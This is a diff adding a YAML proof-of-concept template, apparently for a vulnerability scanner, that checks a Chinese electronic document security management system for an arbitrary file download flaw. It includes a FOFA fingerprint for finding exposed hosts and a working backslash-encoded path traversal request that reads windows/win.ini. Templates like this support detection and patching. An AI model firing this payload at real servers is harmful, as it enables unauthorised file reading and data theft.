@@ -1,0 +1,18 @@
+id: poc-yaml-shangbang-edsms-backup-anyfile-download
+info:
+  name: 上邦电子文档安全管理系统 backup 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 上邦电子文档安全管理系统
+  fofa: body="docsafe/docsafe.nocache.js"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"电子文档安全管理系统")
+- method: GET
+  path: /resources/backup//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && !contains(body,"<") && contains(content_type,"application/octet-steam")
+variables: {}
+transport: http
